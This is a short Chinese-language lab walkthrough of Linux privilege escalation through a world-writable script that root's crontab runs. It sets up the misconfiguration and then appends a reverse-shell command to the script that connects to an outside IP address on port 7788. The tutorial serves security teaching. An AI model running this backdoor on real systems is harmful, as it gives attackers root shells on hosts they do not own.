### 定时任务提权

如果可以 找到 root 权限运行的定时任务脚本, 以及当前用户有权限编辑，那么就可以通过修改脚本实现提权

本质上就是文件权限配置不当

首先以 root 创建一个定时任务

```bash
vim /tmp/test.sh
```

![](https://pic1.imgdb.cn/item/68d36d85c5157e1a882c811f.png)

再编辑定时任务

```
vim /etc/crontab
*/1 * * * * root /bin/bash /tmp/test.sh
```

![](https://pic1.imgdb.cn/item/68d3879bc5157e1a882c8a7e.png)

最后模拟配置错误

```bash
chmod 777 /tmp/test.sh
```

查看计划任务，找到 root 权限运行且有修改权限的定时任务脚本 , 在计划任务对应中追加提权后门

```bash
# 在 derian 用户下查看定时任务
more /etc/crontab
ls -la /tmp/test.sh
```

![](https://pic1.imgdb.cn/item/68d386a8c5157e1a882c8a10.png)

修改脚本

```
/bin/bash -i >& /dev/tcp/113.45.17.228/7788 0>&1
```

![](https://pic1.imgdb.cn/item/68d38766c5157e1a882c8a72.png)